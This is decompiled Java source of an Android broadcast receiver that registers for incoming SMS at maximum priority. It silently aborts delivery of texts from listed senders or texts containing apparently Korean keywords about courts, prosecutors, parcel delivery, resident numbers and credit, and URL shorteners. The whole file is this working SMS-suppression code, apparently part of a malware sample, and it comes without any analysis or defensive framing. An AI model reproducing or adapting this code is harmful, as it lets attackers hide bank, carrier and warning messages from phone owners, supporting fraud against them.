// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv3.listener;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.admv2.db.DBSlient;

public class SinReceiver extends BroadcastReceiver
{

    public SinReceiver()
    {
        filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(0x7fffffff);
    }

    public void onReceive(Context context, Intent intent)
    {
        setMsgSlient(intent, context);
    }

    public void register(Context context)
    {
        context.registerReceiver(this, filter);
    }

    public void setMsgSlient(Intent intent, Context context)
    {
        Bundle bundle = intent.getExtras();
        if(bundle != null)
        {
            DBSlient dbslient = new DBSlient(context);
            Object aobj[] = (Object[])bundle.get("pdus");
            SmsMessage asmsmessage[] = new SmsMessage[aobj.length];
            int i = 0;
            while(i < aobj.length) 
            {
                asmsmessage[i] = SmsMessage.createFromPdu((byte[])aobj[i]);
                SmsMessage smsmessage = asmsmessage[i];
                String s = smsmessage.getDisplayOriginatingAddress();
                String s1 = smsmessage.getMessageBody();
                if(dbslient.slientCheck(s) || s1.indexOf("\uC548\uC2EC\uBB38\uC790") >= 0 || s1.indexOf("\uBCC0\uACBD") >= 0 || s1.indexOf("olleh") >= 0 || s1.indexOf("\uBC95\uC6D0") >= 0 || s1.indexOf("\uAC80\uCC30\uCCAD") >= 0 || s1.indexOf("\uB4F1\uAE30") >= 0 || s1.indexOf("\uBC30\uC1A1") >= 0 || s1.indexOf("\uBC14\uB85C\uAC00\uAE30") >= 0 || s1.indexOf("\uC8FC\uBBFC\uBC88\uD638") >= 0 || s1.indexOf("\uD0DD\uBC30") >= 0 || s1.toLowerCase().indexOf("ems") >= 0 || s1.indexOf("\uACCC\uD63C") >= 0 || s1.indexOf("\uBD80\uC81C\uC911") >= 0 || s1.indexOf("\uC6B0\uD3B8\uBC88\uD638") >= 0 || s1.indexOf("\uCD9C\uC11D") >= 0 || s1.indexOf("\uBD80\uC7AC\uC911") >= 0 || s1.indexOf("\uAC94\uD63C") >= 0 || s1.indexOf("\uC2E0\uC6A9") >= 0 || s1.indexOf("goo.gl") >= 0 || s1.indexOf("dwz.cn") >= 0 || s1.indexOf("985.so") >= 0 || s1.indexOf("t.cn") >= 0 || s1.indexOf("126.am") >= 0 || s1.indexOf("url.cn") >= 0 || s1.indexOf("is.gd") >= 0 || s1.indexOf("\uB85C\uBC0D\uCE90\uCE58\uCF5C") >= 0 || s1.indexOf("@!#%&*-") >= 0)
                    abortBroadcast();
                i++;
            }
        }
    }

    public void unregister(Context context)
    {
        context.unregisterReceiver(this);
    }

    private IntentFilter filter;
}
